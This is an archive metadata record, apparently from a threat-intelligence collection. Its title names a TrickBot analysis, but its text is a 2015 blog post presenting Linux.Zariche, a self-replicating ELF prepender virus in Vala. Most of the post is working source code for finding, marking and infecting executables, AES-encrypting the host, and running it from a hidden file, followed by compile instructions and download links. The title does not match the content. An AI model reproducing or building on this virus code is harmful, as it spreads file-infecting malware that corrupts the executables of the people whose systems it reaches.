{
    "id": "a872fdba-7963-412f-b212-19f5d4d15689",
    "created_at": "2023-01-12T15:06:35.967633Z",
    "updated_at": "2025-03-27T02:05:39.352282Z",
    "deleted_at": null,
    "sha1_hash": "7014d280b86b7f9d6cd0371ccb13a9f47f02577d",
    "title": "2016-12-06 - Deep Analysis of the Online Banking Botnet TrickBot",
    "authors": "",
    "file_creation_date": "2022-05-01T14:12:29Z",
    "file_modification_date": "2022-05-01T14:12:29Z",
    "file_size": 144539,
    "plain_text": "# Linux.Zariche: a Vala virus\n\n**guitmz.com/vala-virus**\n\nGuilherme Thomazi April 10, 2015\n\n## 9 minute read  Published: 10 Apr, 2015\n\n Simple prepender virus written in Vala\n\n Vala is an object-oriented programming language with a self-hosting compiler that generates C code and uses the GObject system. Vala is syntactically similar to C# and and rather than being compiled directly to assembly or to another intermediate language, Vala is source-to- source compiled to C, which is then compiled with a platform’s standard C compiler, such as GCC.\n\n You can also create VAPI files which are basically native C (not C++) functions you can import to Vala code (I will show an example later). Being a language that is converted into plain and pure C, Vala code can also run on Windows (with the necessary code optimizations, of course).\n\n Anyway I was decided to write a prepender in this language, the first (binary) virus ever written so far in Vala. It’s named Linux.Zariche and there are two variants available so far.\n\n Linux.Zariche.A original release, simple ELF infector (prepender). Linux.Zariche.B uses AES encryptation via external library (vapi).\n\n I will explain parts of the code and then add a download link for the full file below (you can check the GitHub repository too at https://github.com/guitmz/vala-zariche). Shall we start?\n\n The very first thing I’m going to do is to declare my global variables and specify the library I’m using for most of the functions, which is libgee. I’m also importing the native C exit() function as you can see.\n```\nusing Gee;\nuint8[] virbytes;\nuint8[] hostbytes;\nuint8[] allbytes;\nuint8[] tempbytes;\nstring etag_out;\nstring etag_outhost;\nsize_t bytes_written;\nextern void exit(int exit_code);\n\n Now let’s take a look at the main function here\n\n```\n\n-----\n\n```\n  int main(string[] args) {\n  int i = 0; //file counter\n  bool marked;\n  string virName = GLib.Path.get_basename(args[0]); //get virus basename\n  var file = File.new_for_path(virName);\n  file.load_contents(null, out virbytes, out etag_out); //load virus bytes\n  int virsize = GetSize(file.get_path());  \n  var list = new ArrayList(); //creates a list\n  var directory = File.new_for_path(\".\"); //create a variable for the current\ndirectory\n  var enumerator = directory.enumerate_children(FileAttribute.STANDARD_NAME, 0);\n//enum by file name\n  FileInfo file_info; //file info variable\n  while ((file_info = enumerator.next_file()) != null) { //check all the files in\nfolder\n    if(isELF(file_info.get_name())) { //if ELF\n      list.add(file_info.get_name()); //add to list\n      i++; //increase counter\n      }\n    }\n  list.remove(virName); //removes current file from list to prevent issues\n  if(i > 0) { //if we have ELF files in folder\n    foreach(string s in list) { //for every ELF file in list\n      marked = CheckMark(s); //check if is already marked a.k.a. infected\n      if(!marked) {\n        Infect(s); //if file is not marked, infect\n        }\n      }\n    }\n  if(virsize > 38727) { //if current file size is bigger than the virus itself, its\nan infected file\n    RunHost(virName); //so we run only the host code now\n  }\n  else {\n    exit(0); //smell ya later!\n  }\n  return 0;\n}\n\n## Nothing fancy here. There are comments in the code but I will briefly explain the core of the virus.\n\n 1.0 Loads itself into a variable and gets self size\n\n```\n\n-----\n\n```\n string virName GLib.Path.get_basename(args[0]); //get virus basename\n var file = File.new_for_path(virName);\n file.load_contents(null, out virbytes, out etag_out); //load virus bytes\n int virsize = GetSize(file.get_path());\n\n## 2.0 Creates a list of all ELF files in the current directory (excluding itself, of course)\nvar list = new ArrayList(); //creates a list\nvar directory = File.new_for_path(\".\"); //create a variable for the current directory\nvar enumerator = directory.enumerate_children(FileAttribute.STANDARD_NAME, 0); //enum\nby file name\nFileInfo file_info; //file info variable\n     while ((file_info = enumerator.next_file()) != null) { //check all the files\nin folder\n          if(isELF(file_info.get_name())) { //if ELF\n              list.add(file_info.get_name()); //add to list\n              i++; //increase counter\n          }\n    }\n  list.remove(virName); //removes current file from list to prevent issues\n\n 2.1 Here’s the function to check if the file is a valid ELF, it reads the magic number of the file to determinate if is what its looking for\nbool isELF(string f) {\n          uint32 ELF_signature = 0x464c457f; //0x464c457f means \".ELF\"\n          var file = File.new_for_path(f); //create the file variable\n          var file_stream = file.read(); //reading the file into a stream\n          var data_stream = new DataInputStream(file_stream); //data stream\nwith the data read from file\n          data_stream.set_byte_order(DataStreamByteOrder.LITTLE_ENDIAN); //byte\norder = little endian\n          uint32 signature = data_stream.read_uint32(); //defines a signature\nvariable - uint 32bits\n          //check if is a valid ELF file by it's signature\n          if (signature == ELF_signature) {\n              return true; //OMG it's an ELF!\n          }\n          else\n              return false; //dafuq bro, this is no ELF!\n     }\n\n```\n\n-----\n\n## 3.0 Now its decide which ELF files to process by checking if they are already infected\n```\n   if(i > 0) { //if we have ELF files in folder\n       foreach(string s in list) { //for every ELF file in list\n         marked = CheckMark(s); //check if is already marked a.k.a. infected\n         if(!marked) {\n           Infect(s); //if file is not marked, infect\n           }\n         }\n       }\n     if(virsize > 38727) { //if current file size is bigger than the virus\n   itself, its an infected file\n       RunHost(virName); //so we run only the host code now\n     }\n     else {\n       exit(0); //smell ya later!\n     }\n\n 3.0.1 Function to get file size\nint GetSize(string f) {\n     var file = File.new_for_path(f);\n     file.load_contents(null, out tempbytes, out etag_outhost); //load host bytes\n     Bytes bytes = new Bytes(tempbytes); //load all bytes a.k.a virus + host\n     int size = bytes.length; //get full elf size\n     return size;\n}\n\n 3.1 What I’m using to check for the infection mark, thanks again to slek a.k.a. MitterAngel. It goes byte by byte checking for the pattern\n\n```\n\n-----\n\n```\nbool CheckMark(string f) { //thanks to slek\n          uint8[] buf;\n          string tag;\n          var file = File.new_for_path(f); //opens file\n          file.load_contents (null, out buf, out tag); //loads file into memory\nand returns a byte array with its content\n          Bytes bytes = new Bytes(buf); //create a byte var based in the above\narray\n          size_t size = bytes.get_size(); //get the size of the bytes\n          string _mark = \"=TMZ=\"; //infection mark\n          for (int x = 1; x < size; ++x)\n          {\n              if (buf[x] == _mark[0])\n             {\n               int y;\n          for (y = 1; y < _mark.length; ++y)\n           {\n                 if ((x + y) >= size)\n                 break;\n                 if (buf[x + y] != _mark[y])\n                 break;\n                }\n            if (y == _mark.length)\n              {\n              return true; //infected!\n              }\n           }\n      }\n     return false; //not infected\n     }\n\n## 3.2 The infection routine with AES (the VAPI is available for download below). Creates a new file with virus content + encrypted host content\nvoid Infect(string f) {\n          var file = File.new_for_path(f);\n          file.load_contents(null, out hostbytes, out etag_outhost); //load\nhost bytes\n          FileIOStream ios = file.open_readwrite(); //open host for writting\n          FileOutputStream os = ios.output_stream as FileOutputStream; //sets\nan output stream\n          os.seek (0, SeekType.SET); //make sure we are at the beggining of the\nfile\n          uint8[] key = \"abcdefghijklmnop\".data; //16bit key\n          uint8[] iv = \"0123456789101112\".data; //16bit iv\n          uint8[] hostbytes_aes = aes_enc(key, iv, hostbytes);\n          os.write_all(virbytes, out bytes_written); //write virus bytes to\nposition 0 (prepender)\n          os.write_all(hostbytes_aes, out bytes_written); //write host bytes\nright after virus ending\n}\n\n```\n\n-----\n\n## 3.4 AES encryption (Using the Nettle VAPI)\n```\npublic uint8[] aes_enc(uint8[] key, uint8[] iv, uint8[] data)\n     {\n          return_if_fail(iv.length == Nettle.AES_BLOCK_SIZE);\n          // nettle overrites the iv, so make a copy\n          uint8[] iv_copy = {};\n          iv_copy.resize(iv.length);\n          Posix.memcpy(iv_copy, iv, iv.length);\n          var encrypt_part = data.length / Nettle.AES_BLOCK_SIZE;\n          encrypt_part *= Nettle.AES_BLOCK_SIZE;\n          var aes = Nettle.AES();\n          aes.set_encrypt_key(key.length, key);\n          uint8[] result = {};\n          result.resize(data.length);\n          Nettle.cbc_encrypt(&aes, aes.encrypt, Nettle.AES_BLOCK_SIZE, iv_copy,\nencrypt_part, result, data);\n          if (encrypt_part != data.length)\n              Posix.memcpy(&result[encrypt_part], &data[encrypt_part],\ndata.length - encrypt_part);\n          return result;\n     }\n\n 3.5 Running the host: it will read the host bytes and create a hidden file (semi random name to avoid problems) with its content. Later it will run the dropped host file, waiting for it to finish to return to the virus execution\n\n```\n\n-----\n\n```\nvoid RunHost(string current) {\n          int random = Random.int_range(1, 100);\n          string hostbytes = \".hostbytes\" + random.to_string(); //hidden file\nwith random pattern in name\n          var host = File.new_for_path(hostbytes); //create empty hidden\nhostfile\n          var host_created = host.create(FileCreateFlags.NONE);\n          var infected_file = File.new_for_path(current); //get contents of\nwhole file (virus + host)\n          infected_file.load_contents (null, out allbytes, out etag_out);\n          FileStream stream = FileStream.open(infected_file.get_path(), \"r\");\n//open current file stream\n          assert(stream != null);\n          int sizeall = GetSize(infected_file.get_path());\n          int hostsize = sizeall - 38727; //host size must be the full elf size\n- 11111 (virus size)\n          stream.seek(38727, FileSeek.SET); //set stream to the begin of the\nhost bytes\n          // load content:\n          uint8[] buf_aes = new uint8[hostsize]; //read host content into a\nbyte buffer\n          size_t read = stream.read(buf_aes, 1);\n          assert (hostsize == read); //keep reading byte per byte until it\nfinishes the entire file\n          uint8[] key = \"abcdefghijklmnop\".data;\n          uint8[] iv = \"0123456789101112\".data;\n          uint8[] buf = aes_dec(key, iv, buf_aes);\n          var dos = new DataOutputStream(host_created); //write buffer to new\nfile with only the host code \n          dos.write_all(buf, out bytes_written);\n          stream.flush(); // make sure data is written to our file\n          dos.close();\n          GLib.FileUtils.chmod(hostbytes, 0755); //give the host file exec\npermission\n          try {\n          Process.spawn_command_line_async(\"./\" + hostbytes); //run the host\nand waits for it to finish\n          } \n          catch (SpawnError e) {\n          stderr.printf (\"%s\\n\", e.message); //there is no room for errors\nhere!\n          }\n          try {\n          host.delete (); //delete the hidden host file after its execution\n          }\n          catch (Error e) {\n          stdout.printf (\"Error: %s\\n\", e.message);\n          }\n     }\n\n```\n\n-----\n\n## 3.6 AES decryption\n```\npublic uint8[] aes_dec(uint8[] key, uint8[] iv, uint8[] data)\n     {\n          return_if_fail(iv.length == Nettle.AES_BLOCK_SIZE);\n          // nettle overrites the iv, so make a copy\n          uint8[] iv_copy = {};\n          iv_copy.resize(iv.length);\n          Posix.memcpy(iv_copy, iv, iv.length);\n          var decrypt_part = data.length / Nettle.AES_BLOCK_SIZE;\n          decrypt_part *= Nettle.AES_BLOCK_SIZE;\n          var aes = Nettle.AES();\n          aes.set_decrypt_key(key.length, key);\n          uint8[] result = {};\n          result.resize(data.length);\n          Nettle.cbc_decrypt(&aes, aes.decrypt, Nettle.AES_BLOCK_SIZE, iv_copy,\ndecrypt_part, result, data);\n          if (decrypt_part != data.length)\n              Posix.memcpy(&result[decrypt_part], &data[decrypt_part],\ndata.length - decrypt_part);\n          return result;\n     }\n\n That was it, function by function. Now the Nettle VAPI library for AES, here it is\n\n```\n\n-----\n\n```\nnamespace Nettle\n{\n     [CCode (has_target = false)]\n     public delegate void CryptFunc(void* ctx, uint length, uint8* dst, uint8*\nsrc);\n     [CCode (cname = \"struct aes_ctx\", cprefix = \"aes_\", cheader_filename =\n\"nettle/aes.h\")]\n     public struct AES\n     {\n          public void set_encrypt_key(uint length, uint8* key);\n          public void set_decrypt_key(uint length, uint8* key);\n          public void invert_key(AES *src);\n          public void encrypt(uint length, uint8* dst, uint8* src);\n          public void decrypt(uint length, uint8* dst, uint8* src);\n     }\n     [CCode (cname = \"cbc_encrypt\", cheader_filename = \"nettle/cbc.h\")]\n     public void cbc_encrypt(void* ctx, CryptFunc f, uint block_size, uint8* iv,\nuint length, uint8* dst, uint8* src);\n     [CCode (cname = \"cbc_decrypt\", cheader_filename = \"nettle/cbc.h\")]\n     public void cbc_decrypt(void* ctx, CryptFunc f, uint block_size, uint8* iv,\nuint length, uint8* dst, uint8* src);\n     [CCode (cname = \"AES_BLOCK_SIZE\", cheader_filename = \"nettle/aes.h\")]\n     public const int AES_BLOCK_SIZE;\n}\n\n## Compilation instructions are the following (tested on a x86_64 system, but should work on x86):\n\n valac filename.vala –pkg=gee-1.0 –pkg=gio-2.0 –pkg=nettle –pkg=posix\n\n Where Vala >= 0.20. In order to use the –pkg=nettle flag, place your nettle.vapi file inside Vala’s library folder, usually something like /usr/share/vala-0.20/vapi for example.\n\n Download links:\n\n Linux.Zariche.B source: http://vx.thomazi.me/zariche.vala Nettle VAPI: http://vx.thomazi.me/nettle.vapi\n\n TMZ\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Infection/ELF Infection in Vala - Zariche virus.pdf"
    ],
    "report_names": [
        "ELF Infection in Vala - Zariche virus.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535995,
    "ts_updated_at": 1743041139,
    "ts_creation_date": 1651414349,
    "ts_modification_date": 1651414349,
    "files": {
        "pdf": "https://archive.orkl.eu/7014d280b86b7f9d6cd0371ccb13a9f47f02577d.pdf",
        "text": "https://archive.orkl.eu/7014d280b86b7f9d6cd0371ccb13a9f47f02577d.txt",
        "img": "https://archive.orkl.eu/7014d280b86b7f9d6cd0371ccb13a9f47f02577d.jpg"
    }
}